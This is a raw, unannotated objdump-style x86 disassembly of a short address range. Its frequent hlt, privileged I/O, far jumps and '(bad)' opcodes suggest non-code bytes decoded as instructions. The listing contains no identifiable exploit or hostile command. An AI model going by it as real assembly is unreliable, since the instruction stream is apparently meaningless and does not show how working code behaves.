  41bd47:	test   DWORD PTR [ebx],eax
  41bd49:	test   al,0xac
  41bd4b:	test   bl,bh
  41bd4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd4e:	xchg   edx,eax
  41bd4f:	test   bl,dh
  41bd51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd52:	mov    esi,0x9aa7eb84
  41bd57:	test   bl,ah
  41bd59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd5a:	pusha  
  41bd5b:	test   ebx,ebx
  41bd5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd5e:	jl     0x41bce5
  41bd60:	shl    DWORD PTR [edi-0x58347ace],cl
  41bd66:	and    BYTE PTR [ebp-0x7aef583d],al
  41bd6c:	mov    ebx,0xb38502a7
  41bd71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd72:	cli    
  41bd73:	test   BYTE PTR [ebx+0x87e4a7],ch
	...
  41bd89:	add    BYTE PTR [eax],al
  41bd8b:	add    BYTE PTR [ebx-0x64780359],ah
  41bd91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd92:	or     BYTE PTR [eax-0x77e9586d],cl
  41bd98:	mov    esp,DWORD PTR [edi-0x587c77c6]
  41bd9e:	inc    eax
  41bd9f:	mov    BYTE PTR [ebx-0x59],bh
  41bda2:	pop    es
  41bda3:	cmp    eax,DWORD PTR [edi+eiz*4]
  41bda6:	hlt    
  41bda7:	das    
  41bda8:	adc    al,0xa7
  41bdaa:	hlt    
  41bdab:	or     DWORD PTR [ebx],0xffffffa7
  41bdae:	hlt    
  41bdaf:	dec    ebp
  41bdb0:	adc    esp,DWORD PTR [edi-0x58f4ac0c]
  41bdb6:	hlt    
  41bdb7:	mov    ds:0xa5f4a713,eax
  41bdbc:	or     esp,DWORD PTR [edi-0x58ec6e0c]
  41bdc2:	hlt    
  41bdc3:	jno    0x41bdd0
  41bdc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdc6:	hlt    
  41bdc7:	in     eax,0x12
  41bdc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdca:	hlt    
  41bdcb:	add    DWORD PTR [ebx],ecx
  41bdcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdce:	hlt    
  41bdcf:	adc    DWORD PTR [ebx],edx
  41bdd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdd2:	hlt    
  41bdd3:	adc    ecx,DWORD PTR [ebx]
  41bdd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdd6:	hlt    
  41bdd7:	mov    ds:0xcbf4a712,eax
  41bddc:	or     ah,BYTE PTR [edi-0x58ed400c]
  41bde2:	hlt    
  41bde3:	pop    edi
  41bde4:	or     ah,BYTE PTR [edi-0x58ed8e0c]
  41bdea:	hlt    
  41bdeb:	cmp    DWORD PTR [edx],ecx
  41bded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdee:	hlt    
  41bdef:	adc    DWORD PTR [eax],eax
	...
  41be01:	add    BYTE PTR [eax],al
  41be03:	add    BYTE PTR [edx],dl
  41be05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be06:	hlt    
  41be07:	sbb    eax,0xe3f4a70a
  41be0c:	adc    eax,0x15e3f4a7
  41be11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be12:	hlt    
  41be13:	retf   
  41be14:	add    eax,0x5b1f4a7
  41be19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be1a:	hlt    
  41be1b:	mov    eax,ds:0x3ff4a715
  41be20:	or     ah,BYTE PTR [edi-0x6b70160c]
  41be26:	or     BYTE PTR [ebx+0xa],ch
  41be29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be2a:	hlt    
  41be2b:	jae    0x41be3f
  41be2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be2e:	hlt    
  41be2f:	add    BYTE PTR [edi],al
  41be31:	pmaddwd mm7,mm7
  41be34:	daa    
  41be35:	pmaddwd mm7,mm7
  41be38:	pop    ss
  41be39:	pmaddwd mm7,mm7
  41be3c:	push   ebx
  41be3d:	pmaddwd mm7,mm7
  41be40:	jne    0x41bdd4
  41be42:	or     BYTE PTR [eax],al
  41be44:	gs pmaddwd mm7,mm7
  41be48:	gs xchg edx,eax
  41be4a:	or     BYTE PTR [eax],al
  41be4c:	cmp    eax,0x5dfff50f
  41be51:	pmaddwd mm7,mm7
  41be54:	stc    
  41be55:	push   cs
  41be56:	cmc    
  41be57:	jmp    FWORD PTR [edi+0xd]
  41be5a:	cmc    
  41be5b:	(bad)  
  41be5c:	jge    0x41be6b
  41be5e:	cmc    
  41be5f:	(bad)  
  41be60:	cmp    eax,0x2dfff50f
  41be65:	pmaddwd mm7,mm7
	...
  41be7c:	scas   eax,DWORD PTR es:[edi]
  41be7d:	or     eax,0xd7ffff5
  41be82:	cmc    
  41be83:	inc    DWORD PTR [ebp-0x5a000af3]
  41be89:	or     eax,0x91e5fff5
  41be8e:	or     BYTE PTR [eax],al
  41be90:	fwait
  41be91:	or     eax,0x91f5fff5
  41be96:	or     BYTE PTR [eax],al
  41be98:	scas   eax,DWORD PTR es:[edi]
  41be99:	or     eax,0x19ebfff5
  41be9e:	cmc    
  41be9f:	push   DWORD PTR [ebp+0x5000891]
  41bea5:	sbb    dh,ch
  41bea7:	(bad)  
  41bea8:	stc    
  41bea9:	sbb    ebp,esi
  41beab:	(bad)  
  41beac:	in     eax,dx
  41bead:	sbb    ebp,esi
  41beaf:	inc    DWORD PTR [ecx]
  41beb1:	sbb    dh,ch
  41beb3:	dec    DWORD PTR [ebx+0x18]
  41beb6:	cmc    
  41beb7:	(bad)  
  41beb8:	aas    
  41beb9:	sbb    ch,dh
  41bebb:	dec    DWORD PTR [ebx+edi*4+0x398c0008]
  41bec2:	cmp    edi,0xff811d83
  41bec8:	jnp    0x41bf0f
  41beca:	cmp    edi,0xff811373
  41bed0:	imul   ebp,DWORD PTR [ecx],0xffffff81
  41bed3:	jmp    DWORD PTR [ebx-0x5]
  41bed6:	cmp    bh,0x5b
  41bed9:	jecxz  0x41be5b
  41bedb:	call   DWORD PTR [ebx-0x17]
  41bede:	cmp    bh,0x0
	...
  41bef1:	add    BYTE PTR [eax],al
  41bef3:	add    BYTE PTR [ebx-0x1f],cl
  41bef6:	cmp    bh,0x43
  41bef9:	add    eax,DWORD PTR [ecx+0x8bb3bff]
  41beff:	add    BYTE PTR [ecx+edi*4-0x42d4007d],cl
  41bf06:	cmp    edi,0x23
  41bf09:	mov    ebx,0x888c0008
  41bf0e:	or     al,0x41
  41bf10:	sahf   
  41bf11:	fsubr  DWORD PTR [ebx-0x5c128e8d]
  41bf17:	imul   ebp,DWORD PTR [ecx-0x4],0x8
  41bf1b:	aas    
  41bf1c:	mov    cs,WORD PTR [ecx]
  41bf1e:	mov    al,ds:0xa3f5685e
  41bf23:	imul   esi,DWORD PTR [ecx-0x45],0x8
  41bf27:	and    DWORD PTR [edx+edi*8+0x105f6ca4],ecx
  41bf2e:	rcr    DWORD PTR [esi+0x62],0x17
  41bf32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf33:	bound  ecx,QWORD PTR [edx+eax*4+0x43e5507]
  41bf3a:	mov    ebp,0xa5045262
  41bf3f:	bound  ecx,QWORD PTR [eax+eax*8+0x1f1f6c09]
  41bf46:	mov    bh,0x6b
  41bf48:	sub    DWORD PTR [ebp+ebx*2-0x715b643d],edx
  41bf4f:	add    ecx,DWORD PTR [ecx+0x38]
  41bf52:	dec    esi
  41bf53:	mov    ds:0xad1330ea,al
	...
  41bf6c:	in     al,dx
  41bf6d:	das    
  41bf6e:	fild   WORD PTR [ebx]
  41bf70:	inc    ecx
  41bf71:	xchg   esi,eax
  41bf72:	cs mov al,0xe0
  41bf75:	ss inc eax
  41bf77:	mov    al,0xbe
  41bf79:	xor    dh,BYTE PTR [ebx]
  41bf7b:	lods   eax,DWORD PTR ds:[esi]
  41bf7c:	in     al,dx
  41bf7d:	das    
  41bf7e:	fild   WORD PTR [ebx]
  41bf80:	pusha  
  41bf81:	xchg   esi,eax
  41bf82:	and    ebp,DWORD PTR [ebp-0x39f4ca14]
  41bf88:	mov    ebp,0x3c040c39
  41bf8d:	xchg   esi,eax
  41bf8e:	cmp    ebp,DWORD PTR [ebp-0x3cfcca54]
  41bf94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf95:	xor    BYTE PTR [esi],cl
  41bf97:	mov    eax,ds:0xd7a42b
  41bf9c:	mov    al,0x27
  41bf9e:	shl    DWORD PTR [ecx-0x3d17db54],cl
  41bfa4:	adc    esp,DWORD PTR [ecx+esi*8-0x24d88800]
  41bfab:	mov    cl,0x6c
  41bfad:	xor    eax,0xa3fbc2b3
  41bfb2:	fld    QWORD PTR [edx]
  41bfb4:	dec    ecx
  41bfb5:	cmp    DWORD PTR [ebx-0x33cf8d3b],esi
  41bfbb:	ret    0x285f
  41bfbe:	xchg   ecx,eax
  41bfbf:	stos   BYTE PTR es:[edi],al
  41bfc0:	ins    DWORD PTR es:[edi],dx
  41bfc1:	sub    DWORD PTR [ebx-0x20aaa35a],ebx
  41bfc7:	add    esp,DWORD PTR [edi]
  41bfc9:	xchg   ebp,eax
  41bfca:	lods   al,BYTE PTR ds:[esi]
  41bfcb:	mov    ebx,0xa79d3533
	...
  41bfe4:	dec    esi
  41bfe5:	xor    bh,BYTE PTR [ebp-0x56]
  41bfe8:	cmp    eax,0xfa870833
  41bfed:	ss data16 jne 0x41bfad
  41bff1:	daa    
  41bff2:	jp     0x41c044
  41bff4:	jmp    0x780:0x88287938
  41bffb:	xor    esp,DWORD PTR cs:[edi]
  41bffe:	dec    esi
  41bfff:	inc    eax
  41c000:	cmp    al,0x36
  41c002:	pop    ecx
  41c003:	push   eax
  41c004:	ss ss or bh,bh
  41c008:	(bad)  
  41c009:	push   ebp
  41c00a:	jp     0x41c058
  41c00c:	das    
  41c00d:	daa    
  41c00e:	imul   esp,DWORD PTR [edi],0x37
  41c011:	das    
  41c012:	imul   esi,DWORD PTR [edi+ebp*1],0x33
  41c016:	js     0x41c028
  41c018:	and    bh,BYTE PTR [eax]
  41c01a:	inc    edi
  41c01b:	jmp    0x1c4c54af
  41c020:	out    dx,eax
  41c021:	xor    bl,BYTE PTR [esi+0x10]
  41c024:	repz daa 
  41c026:	inc    ebp
  41c027:	pop    es
  41c028:	dec    edx
  41c029:	cmp    ah,BYTE PTR [esp+ecx*1-0x70]
  41c02d:	lds    ecx,FWORD PTR [ecx]
  41c02f:	adc    al,0xf2
  41c031:	sub    eax,0x3a41d967
  41c036:	imul   edx,esi,0x40
  41c039:	cmp    DWORD PTR [esi-0x40],ecx
  41c03c:	cmp    esi,DWORD PTR [esi]
  41c03e:	or     BYTE PTR [ebx-0x72],al
  41c041:	push   eax
  41c042:	gs enter 0x4f33,0x5f
  41c047:	retf   
	...
  41c05c:	cmp    eax,0xceb07a42
  41c061:	mov    ds:0x598e9af4,al
  41c066:	imul   ebx,DWORD PTR [ebp-0x759adb41],0xffffffce
  41c06d:	ss ins BYTE PTR es:[edi],dx
  41c06f:	fwait
  41c070:	repnz and edi,DWORD PTR [ecx-0x17]
  41c074:	(bad)  
  41c075:	sbb    BYTE PTR [edi],al
  41c077:	add    dl,ch
  41c079:	stc    
  41c07a:	js     0x41c0d0
  41c07c:	or     dl,dh
  41c07e:	fs push eax
  41c080:	adc    al,0xeb
  41c082:	ins    BYTE PTR es:[edi],dx
  41c083:	inc    ecx
  41c084:	mov    ch,0x96
  41c086:	cmp    DWORD PTR [eax],eax
  41c088:	jmp    0xf539:0x6169
  41c08e:	dec    eax
  41c08f:	imul   esp,edi,0xc27467f3
  41c095:	jmp    0x6d:0x9665417d
  41c09c:	test   eax,0xa96560f3
  41c0a1:	repz dec edx
  41c0a3:	imul   esp,DWORD PTR [ecx+0x650035f3],0x79654b99
  41c0ad:	fnstcw WORD PTR [ecx+0x72]
  41c0b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0b1:	repz bound esi,QWORD PTR [ebp+eax*4-0x16]
  41c0b6:	arpl   WORD PTR [ebx-0x78],sp
  41c0b9:	jmp    0x9af6c135
  41c0be:	pop    ebx
  41c0bf:	imul   eax,DWORD PTR [eax],0x0
	...
  41c0d1:	add    BYTE PTR [eax],al
  41c0d3:	add    BYTE PTR [ecx-0x6b97b80d],bl
  41c0d9:	jmp    0x7460:0xe4e06f58
  41c0e0:	cmp    al,0xd8
  41c0e2:	jge    0x41c158
  41c0e4:	fcom   DWORD PTR [ebp-0xad5fee0]
  41c0ea:	js     0x41c138
  41c0ec:	(bad)  
  41c0ed:	jmp    0x7263:0xe8374578
  41c0f4:	cmc    
  41c0f5:	xchg   ebp,eax
  41c0f6:	sbb    DWORD PTR [ebx],eax
  41c0f8:	and    ebx,ebp
  41c0fa:	js     0x41c16e
  41c0fc:	push   es
  41c0fd:	in     eax,dx
  41c0fe:	fs inc ecx
  41c100:	in     eax,0x95
  41c102:	pop    ebp
  41c103:	add    BYTE PTR [esi+ebp*8+0x72d62ba],cl
  41c10a:	test   al,0x53
  41c10c:	sub    ecx,DWORD PTR [edx]
  41c10e:	lods   eax,DWORD PTR ds:[esi]
  41c10f:	sub    DWORD PTR [bx],ecx
  41c112:	mov    ecx,0x9efe5e30
  41c117:	pop    esi
  41c118:	sbb    al,0x1e
  41c11a:	mov    eax,ds:0x8ab206c
  41c11f:	and    ecx,DWORD PTR [esi-0x109341a5]
  41c125:	push   eax
  41c126:	mov    ebp,0xca7dbf70
  41c12b:	data16 (bad) 
  41c12d:	pop    esi
  41c12e:	mov    eax,0xab373ff
  41c133:	dec    ebp
  41c134:	fcom   QWORD PTR [eax-0x5e]
  41c137:	dec    edi
	...
  41c14c:	fisub  WORD PTR [edx-0x53]
  41c14f:	(bad)  
  41c150:	fistp  QWORD PTR [esi+0xc]
  41c153:	and    eax,0x6cbe5b8e
  41c158:	scas   eax,DWORD PTR es:[edi]
  41c159:	nop
  41c15a:	mov    ebp,0xbebd7f70
  41c15f:	bound  esi,QWORD PTR [edi+ebx*4+0x798caf08]
  41c166:	mov    ds:0xa371b06d,eax
  41c16b:	jno    0x41c10c
  41c16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c16e:	(bad)  
  41c16f:	data16 test al,0xd0
  41c172:	retf   
  41c173:	call   DWORD PTR [ebx]
  41c175:	stos   BYTE PTR es:[edi],al
  41c176:	or     eax,0xbabf7f6c
  41c17b:	pusha  
  41c17c:	jno    0x41c139
  41c17e:	mov    ds:0x9158c3e,eax
  41c183:	inc    esi
  41c184:	rcl    DWORD PTR gs:[ebp+ecx*2+0x45a4e371],1
  41c18c:	jne    0x41c16d
  41c18e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c18f:	mov    WORD PTR ds:[esp+ebx*2-0x7ad4b5fd],ss
  41c197:	lahf   
  41c198:	dec    esp
  41c199:	xor    BYTE PTR [esi-0x246bd14a],cl
  41c19f:	add    al,0x51
  41c1a1:	aaa    
  41c1a2:	jae    0x41c16c
  41c1a4:	and    BYTE PTR [eax],bh
  41c1a6:	jl     0x41c14f
  41c1a8:	cs dec esp
  41c1aa:	sub    BYTE PTR [ecx-0x3b73cfd1],0x0
	...
  41c1c1:	add    BYTE PTR [eax],al
  41c1c3:	add    BYTE PTR [ebx+0x490374a0],bl
  41c1c9:	aaa    
  41c1ca:	pop    ebx
  41c1cb:	shr    dh,cl
  41c1cd:	and    dl,BYTE PTR [edx-0x55]
  41c1d0:	lock cs sub al,0xbc
  41c1d4:	mov    edx,0xc9031994
  41c1d9:	cmp    DWORD PTR [ebx],edi
  41c1db:	enter  0x33f8,0x40
  41c1df:	test   al,0xee
  41c1e1:	dec    ebp
  41c1e2:	xor    eax,0xdf55e8a2
  41c1e7:	add    ebx,eax
  41c1e9:	xchg   ebp,eax
  41c1ea:	cs lahf 
  41c1ec:	mov    edi,0xbfb51843
  41c1f1:	cmp    esp,esi
  41c1f3:	retf   0x36a9
  41c1f6:	push   ds
  41c1f7:	add    al,0xec
  41c1f9:	xchg   ebp,eax
  41c1fa:	cs lahf 
  41c1fc:	lahf   
  41c1fd:	inc    edi
  41c1fe:	or     BYTE PTR [edx-0x4b01d051],ch
  41c204:	iret   
  41c205:	sub    eax,0x28ac9ed1
  41c20a:	(bad)  
  41c20b:	mov    ch,0x82
  41c20d:	push   ebp
  41c20e:	fild   WORD PTR [ebx]
  41c210:	push   ecx
  41c211:	xchg   ebp,eax
  41c212:	scas   al,BYTE PTR es:[edi]
  41c213:	sahf   
  41c214:	jg     0x41c25a
  41c216:	mov    cl,0xaa
  41c218:	jns    0x41c24f
  41c21a:	mov    ebx,0x8225b9e
  41c21f:	(bad)  
  41c220:	sub    eax,0xc0c46437
  41c225:	and    edi,DWORD PTR [edx-0x70]
	...
  41c23c:	and    eax,0x8fe94739
  41c241:	sbb    cl,BYTE PTR [edx]
  41c243:	mov    edx,0x94492422
  41c248:	add    DWORD PTR [esi],esp
  41c24a:	imul   edx,DWORD PTR [edi+0x7b5f53e3],0xa
  41c251:	xor    eax,0x26d9867c
  41c256:	inc    edi
  41c257:	jmp    0x2e4912eb
  41c25c:	repz and ebx,DWORD PTR [eax+0x5b]
  41c260:	aaa    
  41c261:	sub    DWORD PTR [edi+0x5d],esp
  41c264:	and    ecx,DWORD PTR [edi+0x7a]
  41c267:	ds cs ss fs dec esp
  41c26c:	pop    ecx
  41c26d:	xor    ch,BYTE PTR [ecx+0x35]
  41c270:	aaa    
  41c271:	xor    BYTE PTR [esi+0x27],ah
  41c274:	das    
  41c275:	sub    ch,BYTE PTR [ebx+0x3a]
  41c278:	dec    edi
  41c279:	lahf   
  41c27a:	hlt    
  41c27b:	xor    BYTE PTR [edi+0x60156b59],cl
  41c281:	and    eax,0x22ef1f5f
  41c286:	imul   edi,DWORD PTR [ecx],0x2
  41c289:	xor    BYTE PTR [esi+0x10],ch
  41c28c:	in     al,0x31
  41c28e:	aas    
  41c28f:	paddusb mm3,QWORD PTR [ebp+0x8]
  41c293:	ja     0x41c224
  41c295:	pop    ecx
  41c296:	imul   esi,ebp,0x50
  41c299:	and    bh,BYTE PTR [edx-0x25]
  41c29c:	repnz xor BYTE PTR [ebp+eiz*4+0x0],bh
	...
  41c2b1:	add    BYTE PTR [eax],al
  41c2b3:	add    BYTE PTR [esi],dh
  41c2b5:	and    eax,0x3033ca6b
  41c2ba:	jp     0x41c28c
  41c2bc:	into   
  41c2bd:	sahf   
  41c2be:	hlt    
  41c2bf:	add    bl,ch
  41c2c1:	xchg   edi,eax
  41c2c2:	fs jae 0x41c2e6
  41c2c5:	jmp    0xc40d282a
  41c2ca:	hlt    
  41c2cb:	(bad)  
  41c2cc:	mov    eax,0xf9754198
  41c2d1:	out    dx,al
  41c2d2:	ins    DWORD PTR es:[edi],dx
  41c2d3:	inc    edx
  41c2d4:	in     al,dx
  41c2d5:	out    dx,al
  41c2d6:	imul   edx,DWORD PTR [edx+ecx*1-0x3c],0xd810646d
  41c2de:	ins    BYTE PTR es:[edi],dx
  41c2df:	popa   
  41c2e0:	aaa    
  41c2e1:	xchg   ebx,eax
  41c2e2:	add    DWORD PTR [ecx],0x5478fdf2
  41c2e8:	or     al,0xf8
  41c2ea:	pop    edi
  41c2eb:	inc    ebx
  41c2ec:	sbb    ch,dh
  41c2ee:	bound  esi,QWORD PTR [ebp+eiz*4-0x6e]
  41c2f2:	scas   eax,DWORD PTR es:[edi]
  41c2f3:	add    al,dh
  41c2f5:	in     al,dx
  41c2f6:	imul   esp,DWORD PTR [ebp-0x1b],0xb2013a98
  41c2fd:	repz js 0x41c34d
  41c300:	(bad)  
  41c302:	jns    0x41c370
  41c304:	rcr    dh,1
  41c306:	ins    DWORD PTR es:[edi],dx
  41c307:	ins    BYTE PTR es:[edi],dx
  41c308:	rcl    dh,1
  41c30a:	push   ebp
  41c30b:	ins    DWORD PTR es:[edi],dx
  41c30c:	rcl    bh,1
  41c30e:	hlt    
  41c30f:	inc    DWORD PTR [edx]
  41c311:	cwde   
  41c312:	inc    esp
  41c313:	inc    ebx
  41c314:	js     0x41c30d
  41c316:	fs push ebx
	...
  41c32c:	mov    eax,ds:0x926e6de2
  41c331:	xlat   BYTE PTR ds:[ebx]
  41c332:	hlt    
  41c333:	jmp    FWORD PTR [esi+0x7c784998]
  41c339:	in     al,0x44
  41c33b:	jb     0x41c2c7
  41c33d:	icebp  
  41c33e:	imul   esi,DWORD PTR [ebx+0x16],0xd602a592
  41c345:	hlt    
  41c346:	js     0x41c39d
  41c348:	fucomi st,st(1)
  41c34a:	push   ebp
  41c34b:	outs   dx,BYTE PTR ds:[esi]
  41c34c:	mov    edi,cs
  41c34e:	lods   al,BYTE PTR ds:[esi]
  41c34f:	bound  esi,QWORD PTR [eax-0x8]
  41c352:	mov    al,0x60
  41c354:	imul   ebx,ebx,0xcd7b66a4
  41c35a:	mov    dl,0x66
  41c35c:	jo     0x41c33d
  41c35e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35f:	jno    0x41c2ed
  41c361:	shl    BYTE PTR [edi-0x52ef9d8f],cl
  41c367:	xor    BYTE PTR [esi-0x33],bh
  41c36a:	xchg   esp,eax
  41c36b:	imul   esi,DWORD PTR [eax],0xffffffab
  41c36e:	or     BYTE PTR [ecx+0x62b6ea8c],cl
  41c374:	sub    eax,0x2050a81f
  41c379:	sbb    DWORD PTR [eax-0x5509cea2],ebp
  41c37f:	inc    edi
  41c380:	push   ebx
  41c381:	pop    ds
  41c382:	scas   al,BYTE PTR es:[edi]
  41c383:	popa   
  41c384:	sub    eax,0x8c950c47
  41c389:	jbe    0x41c332
  41c38b:	jae    0x41c361
  41c38d:	outs   dx,BYTE PTR ds:[esi]
  41c38e:	mov    al,ds:0x6c
	...
  41c3a3:	add    dh,ch
  41c3a5:	dec    esp
  41c3a6:	mov    al,ds:0x9f46fe45
  41c3ab:	push   eax
  41c3ac:	loopne 0x41c407
  41c3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3af:	pop    esi
  41c3b0:	icebp  
  41c3b1:	stos   DWORD PTR es:[edi],eax
  41c3b2:	or     BYTE PTR [esi],cl
  41c3b4:	mov    WORD PTR [edx-0x53],gs
  41c3b7:	inc    eax
  41c3b8:	ficom  WORD PTR [eax+0x76b173ab]
  41c3be:	mov    bh,0x66
  41c3c0:	test   al,0xab
  41c3c2:	or     BYTE PTR [eax-0x74],ah
  41c3c5:	push   0xffffffad
  41c3c7:	push   ebx
  41c3c8:	lods   eax,DWORD PTR ds:[esi]
  41c3c9:	call   0x71b6:0x90b14aa1
  41c3d0:	test   eax,0x8c0d0c90
  41c3d5:	push   0xffffffad
  41c3d7:	inc    eax
  41c3d8:	sahf   
  41c3d9:	xchg   esp,eax
  41c3da:	les    esp,FWORD PTR [edi+edi*2+0x7ca5b837]
  41c3e1:	sub    al,al
  41c3e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3e4:	ins    BYTE PTR es:[edi],dx
  41c3e5:	aaa    
  41c3e6:	fild   WORD PTR [ebx]
  41c3e8:	std    
  41c3e9:	xchg   ebx,eax
  41c3ea:	mov    esi,0xc54b6ea7
  41c3ef:	lods   al,BYTE PTR ds:[esi]
  41c3f0:	pop    edi
  41c3f1:	sub    eax,eax
  41c3f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3f4:	jb     0x41c410
  41c3f6:	int3   
  41c3f7:	add    esp,DWORD PTR [ecx+0x30]
  41c3fa:	test   dl,dh
  41c3fc:	jge    0x41c46c
  41c3fe:	mov    esp,DWORD PTR [edi+0x19c9437]
  41c404:	inc    ecx
  41c405:	and    DWORD PTR [edi+0xb1],ecx
	...
  41c41b:	add    BYTE PTR [edx],ch
  41c41d:	cs jae 0x41c3bd
  41c420:	push   0xffffff94
  41c422:	jl     0x41c3d6
  41c424:	and    dh,BYTE PTR cs:[edx+0x733869f1]
  41c42b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c42c:	xchg   ebx,eax
  41c42d:	pushf  
  41c42e:	scas   al,BYTE PTR es:[edi]
  41c42f:	add    ebx,esi
  41c431:	xor    DWORD PTR [esi-0x3b],ecx
  41c434:	repz xor DWORD PTR [ebp-0x37],ecx
  41c438:	out    dx,al
  41c439:	sbb    eax,0x94b2bc2c
  41c43e:	test   eax,0x4e31be03
  41c443:	rcr    esi,cl
  41c445:	xor    DWORD PTR [ecx],esi
  41c447:	mov    ebx,0xaf3335c1
  41c44c:	out    dx,al
  41c44d:	push   ecx
  41c44e:	daa    
  41c44f:	ret    
  41c450:	dec    ebx
  41c451:	pushf  
  41c452:	pop    ebp
  41c453:	add    ebx,esi
  41c455:	xor    DWORD PTR [esi],eax
  41c457:	shl    DWORD PTR [edi-0x3b60edd5],0x31
  41c45e:	or     BYTE PTR [ecx+ebx*2],al
  41c461:	xchg   esi,eax
  41c462:	adc    DWORD PTR [edi-0x6f7b458],ebx
  41c468:	cli    
  41c469:	sub    DWORD PTR [ecx+0x4],eax
  41c46c:	xlat   BYTE PTR ds:[ebx]
  41c46d:	pop    edx
  41c46e:	or     BYTE PTR ds:0xc66b468f,ch
  41c474:	inc    edx
  41c475:	sub    bh,BYTE PTR [ebx-0x3c]
  41c478:	les    esi,FWORD PTR [esi]
  41c47a:	outs   dx,DWORD PTR ds:[esi]
  41c47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c47c:	aaa    
  41c47d:	pop    ebx
  41c47e:	or     BYTE PTR [ebx+0x0],al
	...
  41c494:	pop    DWORD PTR [esi+0x6b]
  41c497:	(bad)  
  41c498:	int3   
  41c499:	and    eax,0x372bc86b
  41c49e:	inc    ecx
  41c49f:	les    edx,FWORD PTR [esi]
  41c4a1:	pop    ebx
  41c4a2:	or     BYTE PTR [esi],cl
  41c4a4:	pop    DWORD PTR [esi+0x6b]
  41c4a7:	xchg   ah,bl
  41c4a9:	ss jl  0x41c46b
  41c4ac:	out    dx,al
  41c4ad:	das    
  41c4ae:	jnp    0x41c434
  41c4b0:	repnz and eax,DWORD PTR [edi-0x17]
  41c4b4:	(bad)  
  41c4b5:	outs   dx,DWORD PTR ds:[esi]
  41c4b6:	pop    es
  41c4b7:	mov    al,0xdc
  41c4b9:	inc    edi
  41c4ba:	imul   esi,DWORD PTR [ecx-0x15],0x46
  41c4be:	data16 sub ah,0x28
  41c4c2:	ins    BYTE PTR es:[edi],dx
  41c4c3:	dec    esp
  41c4c4:	nop
  41c4c5:	retf   0x3b06
  41c4c8:	and    esi,DWORD PTR [eax]
  41c4ca:	inc    ebp
  41c4cb:	pop    ecx
  41c4cc:	sbb    ebp,DWORD PTR [ecx]
  41c4ce:	dec    ecx
  41c4cf:	push   esp
  41c4d0:	ds and eax,0x461c576b
  41c4d6:	jns    0x41c51c
  41c4d8:	push   ds
  41c4d9:	fwait
  41c4da:	hlt    
  41c4db:	scas   al,BYTE PTR es:[edi]
  41c4dc:	mov    es,WORD PTR [esi+0x6b]
  41c4df:	inc    esi
  41c4e0:	adc    ebp,DWORD PTR [ecx]
  41c4e2:	jnp    0x41c4f8
  41c4e4:	pop    edx
  41c4e5:	cmp    ah,BYTE PTR [esp+edx*1+0x23]
  41c4e9:	pop    edx
  41c4ea:	or     dl,dh
  41c4ec:	mov    ss,WORD PTR [ecx+0x6b]
  41c4ef:	adc    eax,0x6b2443
  41c4f4:	daa    
  41c4f5:	rcl    DWORD PTR [ebp+0x6d],1
	...
  41c50c:	mov    bh,dl
  41c50e:	hlt    
  41c50f:	inc    DWORD PTR [esp+esi*8-0x11ea9e86]
  41c516:	aaa    
  41c517:	xor    ah,BYTE PTR [ebx-0xa939f0c]
  41c51d:	xchg   esi,eax
  41c51e:	fld    QWORD PTR [eax]
  41c520:	ss out dx,eax
  41c522:	imul   ebp,DWORD PTR [ecx+esi*1-0x26],0xe9d6657c
  41c52a:	js     0x41c591
  41c52c:	xor    al,0x97
  41c52e:	ja     0x41c598
  41c530:	enter  0x60f2,0x33
  41c534:	xlat   BYTE PTR ds:[ebx]
  41c535:	mov    al,0x68
  41c537:	ins    BYTE PTR es:[edi],dx
  41c538:	and    DWORD PTR [edi-0xf03ff83],edx
  41c53e:	js     0x41c5a5
  41c540:	pop    ss
  41c541:	icebp  
  41c542:	imul   esi,DWORD PTR [esi+eiz*8-0x1c],0xc9fe6355
  41c54a:	jbe    0x41c5b8
  41c54c:	hlt    
  41c54d:	xchg   esi,eax
  41c54e:	outs   dx,DWORD PTR ds:[esi]
  41c54f:	add    ah,ch
  41c551:	lock js 0x41c5b9
  41c554:	pop    ss
  41c555:	icebp  
  41c556:	imul   esi,DWORD PTR [esi+esi*4-0x1e],0xebd96169
  41c55e:	pop    ecx
  41c55f:	jb     0x41c532
  41c561:	iret   
  41c562:	hlt    
  41c563:	(bad)  
  41c564:	(bad)  
  41c566:	bound  ebp,QWORD PTR [ecx-0x3d]
  41c569:	jmp    0x41c5e3
  41c56b:	cs leave 
  41c56d:	hlt    
  41c56e:	pusha  
	...
  41c583:	add    BYTE PTR [eax-0x6f],dh
  41c586:	push   edi
  41c587:	je     0x41c520
  41c589:	sar    DWORD PTR [eax+0x72],0x7c
  41c58d:	iret   
  41c58e:	hlt    
  41c58f:	push   DWORD PTR ds:0x8c745791
  41c595:	jge    0x41c575
  41c597:	inc    eax
